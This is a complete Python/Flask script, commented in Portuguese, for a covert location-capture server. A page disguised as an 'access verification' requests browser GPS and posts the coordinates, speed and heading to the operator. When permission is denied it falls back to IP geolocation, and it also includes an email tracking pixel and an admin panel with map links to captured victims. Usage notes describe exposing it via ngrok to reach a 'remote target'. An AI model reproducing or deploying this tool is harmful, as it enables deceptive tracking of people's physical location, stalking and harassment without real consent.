#!/usr/bin/env python3
"""
geotrack.py — captura de GPS via navegador + fallback geo-IP, num só arquivo.

Requisitos:
    pip install flask requests
    pip install pyopenssl        # só se for usar --tls (certificado self-signed)

Uso:
    python3 geotrack.py --port 8000                 # HTTP direto
    python3 geotrack.py --port 8443 --tls           # HTTPS self-signed
    ngrok http 8000                                 # expõe na internet (use a URL https do ngrok)

Fluxo:
    /             página que pede permissão de localização
    /log          recebe POST JSON do navegador (aceita GET + pixel para e-mail)
    /iploc        geo-IP server-side (fallback quando GPS é negado)
    /admin        painel (use ?token=...), ?download=1 exporta o JSONL
"""
import argparse, base64, json, os, secrets, socket
from datetime import datetime, timezone
from html import escape

import requests
from flask import Flask, Response, jsonify, request

app = Flask(__name__)
DATA_FILE = os.environ.get("GEOTRACK_FILE", "captures.jsonl")
ADMIN_TOKEN = os.environ.get("GEOTRACK_TOKEN") or secrets.token_urlsafe(12)
GIF = "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"  # pixel 1x1

PAGE = """<!doctype html>
<html lang="pt-BR">
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verificação de acesso</title>
<style>
 body{font-family:system-ui,-apple-system,sans-serif;max-width:34rem;margin:12vh auto;padding:0 1.2rem;line-height:1.5}
 h2{margin:0 0 .4rem} #s{color:#555;font-size:.95rem} button{padding:.7rem 1.2rem;font-size:1rem;cursor:pointer}
</style></head>
<body>
<h2 id="h">Confirme sua localização</h2>
<p id="s">Solicitando permissão de localização…</p>
<button id="b">Permitir localização</button>
<script>
const S=document.getElementById('s'),B=document.getElementById('b'),H=document.getElementById('h');
async function send(p){try{await fetch('/log',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify(p),keepalive:true});}catch(e){}}
async function ipFallback(reason){
  try{const r=await fetch('/iploc');const d=await r.json();await send(Object.assign({source:'ip',reason:reason},d));}
  catch(e){await send({source:'ip',reason:reason,error:String(e)});}
}
function ask(){
  S.textContent='Aguardando permissão…';
  if(!navigator.geolocation){S.textContent='Geolocalização não suportada.';return ipFallback('unsupported');}
  navigator.geolocation.getCurrentPosition(
    async p=>{
      S.textContent='Localização confirmada.';H.textContent='Obrigado!';
      await send({source:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,
        alt:p.coords.altitude,heading:p.coords.heading,speed:p.coords.speed,ts:p.timestamp});
      B.style.display='none';
    },
    err=>{S.textContent='Permissão negada ou indisponível. Registrando acesso…';
      ipFallback('gps_error_'+err.code);B.style.display='none';},
    {enableHighAccuracy:true,timeout:12000,maximumAge:0}
  );
}
B.addEventListener('click',ask); ask();
</script></body></html>"""


def client_ip():
    fwd = request.headers.get("X-Forwarded-For", "")
    return (fwd.split(",")[0].strip() or request.remote_addr or "")


def write_record(rec):
    rec.setdefault("time", datetime.now(timezone.utc).isoformat())
    rec.setdefault("ip", client_ip())
    rec.setdefault("ua", request.headers.get("User-Agent", ""))
    if rec.get("lat") and rec.get("lon"):
        rec["map"] = f"https://maps.google.com/?q={rec['lat']},{rec['lon']}"
    with open(DATA_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    return rec


@app.route("/")
def index():
    return Response(PAGE, mimetype="text/html")


@app.route("/log", methods=["POST", "GET"])
def log():
    if request.method == "GET":
        payload = request.args.to_dict()
    else:
        payload = request.get_json(silent=True) or request.form.to_dict() or {}
    rec = write_record(dict(payload))
    print(f"[+] {rec.get('source')} {rec.get('lat')},{rec.get('lon')} acc={rec.get('acc')} ip={rec['ip']}")
    if request.method == "GET":  # pixel para e-mail
        return Response(base64.b64decode(GIF), mimetype="image/gif")
    return ("", 204)


@app.route("/iploc")
def iploc():
    ip = client_ip()
    if not ip or ip.startswith(("127.", "10.", "192.168.", "172.16.", "::1")):
        return jsonify({"ip": ip, "note": "loopback/privado — use a URL pública (ngrok)"})
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}"
            "?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query",
            timeout=5,
        )
        return jsonify(r.json())
    except Exception as e:
        return jsonify({"ip": ip, "error": str(e)})


@app.route("/admin")
def admin():
    if request.args.get("token") != ADMIN_TOKEN:
        return Response(f"token inválido — acesse /admin?token={ADMIN_TOKEN}", 401, mimetype="text/plain")
    if request.args.get("download") == "1" and os.path.exists(DATA_FILE):
        return Response(open(DATA_FILE, encoding="utf-8").read(), mimetype="application/json",
                        headers={"Content-Disposition": 'attachment; filename="captures.jsonl"'})
    recs = []
    if os.path.exists(DATA_FILE):
        for line in open(DATA_FILE, encoding="utf-8"):
            line = line.strip()
            if line:
                try:
                    recs.append(json.loads(line))
                except json.JSONDecodeError:
                    pass
    cols = ("time", "source", "lat", "lon", "acc", "city", "regionName", "isp", "ip")
    head = "".join(f"<th>{c}</th>" for c in cols) + "<th>mapa</th>"
    rows = []
    for r in reversed(recs[-500:]):
        cells = "".join(f"<td>{escape(str(r.get(c, '')))}</td>" for c in cols)
        m = r.get("map", "")
        link = f"<a href='{escape(m)}' target='_blank'>abrir</a>" if m else ""
        rows.append(f"<tr>{cells}<td>{link}</td></tr>")
    html = f"""<!doctype html><meta charset="utf-8"><title>capturas</title>
    <style>body{{font:14px system-ui;margin:2rem}}table{{border-collapse:collapse;width:100%}}
    td,th{{border:1px solid #ddd;padding:.35rem .5rem;text-align:left;vertical-align:top}}
    th{{background:#f4f4f4;position:sticky;top:0}}</style>
    <h2>Capturas ({len(recs)})</h2>
    <p><a href="/admin?token={ADMIN_TOKEN}&download=1">baixar JSONL</a> · token: <code>{ADMIN_TOKEN}</code></p>
    <table><thead><tr>{head}</tr></thead><tbody>{''.join(rows)}</tbody></table>"""
    return Response(html, mimetype="text/html")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8000)
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--tls", action="store_true", help="HTTPS self-signed (navegador pede GPS mesmo fora de localhost)")
    a = ap.parse_args()

    print(f"[*] token do painel: {ADMIN_TOKEN}")
    print(f"[*] painel:  /admin?token={ADMIN_TOKEN}")
    try:
        for ip in {socket.gethostbyname(socket.gethostname())}:
            print(f"[*] link local: http://{ip}:{a.port}/")
    except OSError:
        pass
    if a.tls:
        print("[*] HTTPS self-signed — o navegador vai avisar do certificado, é esperado")
        app.run(host=a.host, port=a.port, ssl_context="adhoc")
    else:
        print("[*] HTTP — para alvo remoto use ngrok (HTTPS) ou --tls")
        app.run(host=a.host, port=a.port)


if __name__ == "__main__":
    main()